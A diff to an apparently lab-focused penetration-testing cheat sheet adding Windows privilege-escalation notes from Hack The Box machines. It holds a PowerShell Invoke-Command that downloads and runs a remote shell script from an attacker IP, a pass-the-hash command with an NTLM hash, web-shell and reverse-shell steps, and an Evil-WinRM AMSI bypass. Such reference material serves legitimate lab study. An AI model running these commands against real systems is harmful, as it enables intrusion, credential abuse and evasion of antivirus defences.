@@ -175,6 +175,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Privileges](#privileges)
     - [Strategy](#strategy-1)
     - [Add new admin user](#add-new-admin-user)
+    - [Log in with another user from the same machine](#log-in-with-another-user-from-the-same-machine)
     - [Generate a reverse shell](#generate-a-reverse-shell)
     - [Kernel Exploits](#kernel-exploits-1)
     - [Driver Exploits](#driver-exploits)
@@ -190,9 +191,13 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Hot Potato](#hot-potato)
     - [Token Impersonation](#token-impersonation)
     - [getsystem](#getsystem)
+    - [Pass The Hash](#pass-the-hash-1)
+    - [Apache lateral movement](#apache-lateral-movement)
+    - [Read data stream](#read-data-stream)
   - [Buffer Overflow](#buffer-overflow)
   - [Antivirus Evasion](#antivirus-evasion)
     - [ToDo](#todo)
+    - [With Evil-WinRM](#with-evil-winrm)
     - [Thread Injection](#thread-injection)
     - [Shellter](#shellter)
   - [Active Directory](#active-directory)
@@ -4683,6 +4688,17 @@ int main () {
 - verify that the user has been added with `net user`
 - run `echo password | runas /savecred /user:rootevil cmd`
 
+#### <ins>Log in with another user from the same machine</ins>
+
+```
+$username = "BART\Administrator"
+$password = "3130438f31186fbaf962f407711faddb"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
+```
+
 #### <ins>Generate a reverse shell</ins>
 
 1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
@@ -4975,6 +4991,30 @@ Note: This attack works on Windows 7, 8, early versions of Windows 10, and their
 - **Token Duplication**: Windows permits processes and threads to use multiple access tokens. This allows for the duplication of an impersonation access token into a main access token. If we have the ability to inject into a process, we can leverage this feature to copy the process's access token and launch a new process with the same rights.
 - **Documentation**: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
 
+#### <ins>Pass The Hash</ins>
+- `pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd`
+
+
+#### <ins>Apache lateral movement</ins>
+- If you have logged in with an user, and you see the apache user, you might try to move laterally and from that user try to escalate
+- check if you have write access to 'C:\xampp\htdocs' with `echo testwrite > testdoc.txt`
+- if you have write privileges, download a cmd.php shell and check who the user is. If it's apache, do a reverse shell
+
+
+#### <ins>Read data stream</ins>
+
+maybe you are in a directory where there is something strange
+
+1. use `dir /r`
+   you might find files like the following
+   ```
+   hm.txt
+   hm.txt:root.txt:$DATA
+   ```
+2. Use the following command
+   `powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
+- See Hack The Box - Jeeves
+
 
 ### <ins>Buffer Overflow</ins>
 
@@ -5185,6 +5225,10 @@ On Immunity, using mona, type
 - As last resort, check the malware created with
   - [VirusTotal](https://www.virustotal.com/)
   - [AntiScan.Me](https://antiscan.me/)
+
+### <ins>With Evil-WinRM</ins>
+1. `*Evil-WinRM* PS C:\programdata> menu`
+2. `*Evil-WinRM* PS C:\programdata> Bypass-4MSI`
 
 ### <ins>Thread Injection</ins>
 
